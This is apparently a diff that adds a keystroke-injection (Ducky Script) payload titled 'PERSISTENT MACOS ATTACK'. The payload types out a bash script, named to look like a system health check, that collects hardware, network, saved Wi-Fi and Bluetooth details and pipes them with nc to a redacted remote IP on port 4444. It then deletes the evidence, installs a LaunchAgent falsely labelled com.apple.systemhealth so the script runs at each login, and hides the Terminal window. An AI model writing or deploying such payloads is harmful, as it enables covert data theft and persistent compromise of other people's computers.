@@ -1,0 +1,130 @@
+REM PERSISTENT MACOS ATTACK
+REM AUTHOR CAMERON KORODY
+
+REM START PROGRAM
+REM OPEN TERMINAL
+LED_OFF
+DELAY 500
+COMMAND SPACE
+DELAY 250
+STRING Terminal
+ENTER
+DELAY 1000
+
+REM CREATE BASH SCRIPT
+REM DATA COLLECTION PORTION
+STRING nano /tmp/systemhealth.sh
+ENTER
+DELAY 20
+STRING echo "========================DEVICE INFORMATION========================" > /tmp/systemhealth.txt
+ENTER
+STRING system_profiler SPHardwareDataType >> /tmp/systemhealth.txt
+ENTER
+STRING echo "========================IP INFORMATION========================" >> /tmp/systemhealth.txt
+ENTER
+STRING ifconfig >> /tmp/systemhealth.txt
+ENTER
+STRING echo "========================SAVED SSIDs INFORMATION========================" >> /tmp/systemhealth.txt
+ENTER
+STRING networksetup -listpreferredwirelessnetworks en0 >> /tmp/systemhealth.txt
+ENTER
+STRING echo "========================NETWORK INFORMATION========================" >> /tmp/systemhealth.txt
+ENTER
+STRING system_profiler SPAirPortDataType >> /tmp/systemhealth.txt
+ENTER
+STRING echo "========================BLUETOOTH INFORMATION========================" >> /tmp/systemhealth.txt
+ENTER
+STRING system_profiler SPBluetoothDataType >> /tmp/systemhealth.txt
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+REM EXFIL PORTION
+STRING cat /tmp/systemhealth.txt | nc <REDACTED IP ADDRESS> 4444
+ENTER
+ENTER
+ENTER
+REM CLEANUP
+STRING rm /tmp/systemhealth.txt
+ENTER
+CTRL x
+DELAY 20
+Y
+DELAY 20
+ENTER
+DELAY 20
+STRING chmod +x /tmp/systemhealth.sh
+ENTER
+DELAY 50
+STRING bash /tmp/systemhealth.sh
+ENTER
+
+REM WRITE TO PLIST TO WORK UPON RESTART
+DELAY 100
+STRING cat << 'EOF' > ~/Library/LaunchAgents/com.apple.systemhealth.plist 
+ENTER
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST1 1.0/EN" http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+ENTER
+STRING <plist version="1.0">
+ENTER
+ENTER
+STRING <dict>
+ENTER
+ENTER
+TAB
+STRING <key>Label</key>
+ENTER
+ENTER
+TAB
+STRING <string>com.apple.systemhealth</string>
+ENTER
+ENTER
+ENTER
+TAB
+STRING <key>ProgramArguments</key>
+ENTER
+TAB
+STRING <array>
+ENTER
+TAB
+TAB
+STRING <string>/bin/bash</string>
+ENTER
+TAB
+TAB
+STRING <string>/tmp/systemhealth.sh</string>
+ENTER
+TAB
+STRING </array>
+ENTER
+ENTER
+ENTER
+TAB
+STRING <key>RunAtLoad</key>
+ENTER
+TAB
+STRING <true/>
+ENTER
+TAB
+STRING <key>KeepAlive</key>
+ENTER
+TAB
+STRING <false/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>
+ENTER
+STRING EOF
+ENTER
+DELAY 20
+STRING launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.apple.systemhealth.plist
+ENTER
+COMMAND l
+DELAY 20
+COMMAND m
+END
